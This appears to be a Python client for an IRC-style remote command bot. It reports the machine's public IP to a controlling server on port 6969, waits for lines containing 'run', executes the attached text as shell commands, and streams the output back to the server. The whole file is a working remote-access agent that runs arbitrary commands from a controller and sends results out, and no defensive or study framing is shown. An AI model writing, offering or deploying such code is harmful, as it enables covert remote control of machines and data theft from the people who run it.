import socket
import time
import datetime
import requests
from threading import Thread
import subprocess


ip = requests.get(url='http://ipinfo.io/ip').text
# ip = 'some random ip'
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    irc.connect(('', 6969))
except ConnectionRefusedError:
    print('can\'t connect, is server running ? check ip and port')
    exit(1)
irc.send(bytes('add {}\r\n'.format(ip), 'utf-8'))


def run(cmd):
    proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if len(proc.stderr) != 0:
        err_lines = proc.stderr.decode().split('\n')
        for line in err_lines:
            if len(line) == 0:
                continue
            irc.send(bytes('{}: {}\r\n'.format(ip, line), 'utf-8'))
    if len(proc.stdout) != 0:
        output_lines = proc.stdout.decode().split('\n')
        for line in output_lines:
            if len(line) == 0:
                continue
            irc.send(bytes('{}: {}\r\n'.format(ip, line), 'utf-8'))


while True:
    try:
        line = irc.recv(512)
        print(line.decode('utf-8'))
        if line.decode().find('run') != -1:
            cmd = line.decode().split(maxsplit=1)
            Thread(target=run, args=((cmd[1].strip('\n')).strip('\r'), )).start()
    except KeyboardInterrupt:
        break
    except:
        pass
